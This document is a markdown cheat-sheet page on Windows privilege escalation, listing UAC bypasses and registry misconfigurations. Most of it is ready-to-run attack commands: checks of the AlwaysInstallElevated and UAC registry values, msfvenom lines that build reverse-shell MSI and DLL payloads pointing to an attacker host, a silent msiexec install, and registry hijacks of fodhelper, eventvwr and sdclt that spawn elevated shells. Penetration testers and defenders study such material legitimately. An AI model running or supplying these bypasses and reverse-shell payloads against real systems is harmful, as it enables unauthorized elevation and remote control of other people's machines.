---
title: UAC Bypass & Misconfigs
category: privesc-windows
description: Common UAC bypasses and registry tricks.
tags: [windows, privesc, uac]
os: [windows]
order: 20
---

## Check UAC state

```cmd
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
```

`EnableLUA=0` → no UAC. `ConsentPromptBehaviorAdmin=0` → auto-elevate (no prompt).

## AlwaysInstallElevated

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

If both = `0x1`:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f msi -o evil.msi
```

```cmd
msiexec /quiet /qn /i C:\Temp\evil.msi
```

## fodhelper.exe (autoelevate)

```powershell
New-Item "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value ""
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(default)" -Value "cmd /c start cmd"
Start-Process "C:\Windows\System32\fodhelper.exe"
```

## eventvwr.exe (legacy)

```powershell
New-Item -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(default)" -Value "cmd /c start cmd"
Start-Process eventvwr.exe
```

## sdclt.exe (App Paths)

```powershell
New-Item -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "(default)" -Value "cmd /c start cmd"
Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute" -Value ""
Start-Process sdclt.exe
```

## UAC bypass tooling

```text
UACMe (≈70 methods, by hfiref0x)
PowerUp:  Invoke-WScriptBypassUAC
```

## DLL hijacking (admin → SYSTEM occasionally; mid → admin sometimes)

Find a target exe whose loaded DLL search path goes through a writable dir. Procmon → "NAME NOT FOUND" on a DLL → drop your DLL.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f dll -o hijack.dll
```
